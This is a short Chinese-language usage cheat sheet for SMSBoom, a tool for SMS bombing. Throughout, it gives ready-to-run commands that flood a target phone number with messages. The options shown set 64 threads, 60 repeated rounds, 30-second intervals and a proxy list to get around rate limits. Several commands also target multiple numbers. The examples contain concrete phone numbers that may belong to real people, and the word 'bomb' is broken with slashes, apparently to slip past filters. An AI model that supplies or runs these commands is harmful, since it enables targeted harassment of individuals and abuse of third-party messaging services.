
cd SMSBoom
cd..
cd /d D:

ctrl+C 终止

单线程调用：

python smsboom.py oneRun -p 15274777477

多线程调用：
python smsboom.py run -t 64 -p 15274777477


协程调用：
python smsboom.py asyncRun -p 15274777477


命令示例
启动64个线程,轰//炸一个人的手机号(198xxxxxxxx),只轰//炸一波。
python smsboom.py run -t 64 -p 15274777477


启动64个线程,轰//炸一个人的手机号(198xxxxxxxx),启动循环轰//炸, 轮番轰//炸60次
python smsboom.py run -t 64 -p 15274777477 -f 60


启动64个线程,轰//炸一个人的手机号(198xxxxxxxx),启动循环轰//炸, 轮番轰//炸60次, 每次间隔30秒
python smsboom.py run -t 64 -p 15274777477 -f 60 -i 30


启动64个线程,轰//炸一个人的手机号(198xxxxxxxx),启动循环轰//炸, 轮番轰//炸60次, 每次间隔30秒, 开启代理列表进行轰炸
python smsboom.py run -t 64 -p 15274777477 -f 60 -i 30 -e


启动64个线程,轰//炸多个人的手机号(198xxxxxxxx,199xxxxxxxx),启动循环轰//炸, 轮番轰炸60次, 每次间隔30秒, 开启代理列表进行轰炸
python smsboom.py run -t 64 -p 18229854366 -p 199xxxxxxxx -f 60 -i 30 -e
